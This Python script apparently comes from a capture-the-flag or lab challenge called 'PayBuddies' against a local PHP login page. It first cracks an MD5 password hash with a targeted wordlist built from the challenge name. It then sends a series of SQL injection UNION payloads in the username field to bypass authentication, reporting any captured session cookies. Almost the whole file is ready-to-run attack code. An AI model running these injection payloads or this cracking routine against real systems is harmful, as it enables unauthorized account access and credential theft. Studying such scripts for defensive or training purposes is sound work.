import requests
import hashlib
import itertools

# The target hash from context
target_hash = "7d39307ae824e70052c0aa16816a9b16"

# Generate targeted passwords based on challenge context "PayBuddies"
base_words = ['paybuddies', 'PayBuddies', 'paybuddy', 'PayBuddy', 'payroll', 'Payroll', 'buddy', 'Buddy', 'pay', 'Pay']
suffixes = ['', '!', '123', '!123', '2024', '2023', '!2024', '@123', '123!', '1234', '12345', '123456', '@', '#', '$', '1', '12']
prefixes = ['', 'welcome', 'Welcome', 'admin', 'Admin', 'test', 'Test']

passwords_to_test = set()  # Use set to avoid duplicates

# Generate combinations
for base in base_words:
    passwords_to_test.add(base)
    passwords_to_test.add(base.lower())
    passwords_to_test.add(base.upper())
    passwords_to_test.add(base.capitalize())
    
    for suffix in suffixes:
        passwords_to_test.add(base + suffix)
        passwords_to_test.add(base.lower() + suffix)
        passwords_to_test.add(base.upper() + suffix)
    
    for prefix in prefixes:
        if prefix:
            passwords_to_test.add(prefix + base)
            passwords_to_test.add(prefix + base.lower())

# Convert to list
passwords_list = list(passwords_to_test)

# Test each password against the hash
print(f"[*] Testing {len(passwords_list)} targeted passwords against hash {target_hash}...")
found_password = None

for pwd in passwords_list:
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash matches: {hash_val}")
        found_password = pwd
        break

if not found_password:
    print(f"[-] No match found in {len(passwords_list)} attempts")
    print("[*] Sample tested passwords:", passwords_list[:10])

# Now try SQLi bypass with UNION injection to control returned password
print("\n" + "="*60)
print("[*] Attempting SQLi UNION bypass with controlled password hash")
print("="*60)

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

# MD5 hash of common passwords
known_hashes = {
    'password': '5f4dcc3b5aa765d61d8327deb882cf99',
    'admin': '21232f297a57a5a743894a0e4a801fc3',
    'test': '098f6bcd4621d373cade4e832627b4f6',
    '123456': 'e10adc3949ba59abbe56e057f20f883e',
    'admin123': '0192023a7bbd73250516f069df18b500'
}

# Try UNION injections with different column counts and orders
union_payloads = [
    # 3 columns
    ("' UNION SELECT 1,'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
    ("' UNION SELECT 'hacker','5f4dcc3b5aa765d61d8327deb882cf99',1-- ", "password"),
    
    # 2 columns
    ("' UNION SELECT 'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
    ("' UNION SELECT '5f4dcc3b5aa765d61d8327deb882cf99','hacker'-- ", "password"),
    
    # 4 columns
    ("' UNION SELECT 1,2,'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
    ("' UNION SELECT 'hacker','5f4dcc3b5aa765d61d8327deb882cf99',1,2-- ", "password"),
    
    # Try with NULL
    ("' UNION SELECT NULL,'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
    
    # Variations with admin
    ("admin' UNION SELECT 1,'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
    ("' OR 1=1 UNION SELECT 1,'hacker','5f4dcc3b5aa765d61d8327deb882cf99'-- ", "password"),
]

for username_sqli, pwd in union_payloads:
    data = {
        "username": username_sqli,
        "password": pwd,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"\n[*] Testing: {username_sqli[:60]}...")
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
        
        if "Success" in response.text or "success" in response.text.lower():
            print("[!] AUTHENTICATION BYPASS SUCCESSFUL!")
            print(f"[!] Successful username payload: {username_sqli}")
            print(f"[!] Password used: {pwd}")
            if response.cookies:
                print(f"[!] Session cookies: {response.cookies.get_dict()}")
            break
        elif "Invalid" not in response.text and "Wrong" not in response.text and response.text.strip():
            print("[?] ANOMALY - Unexpected response (not standard failure)")
            
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[*] Testing complete")

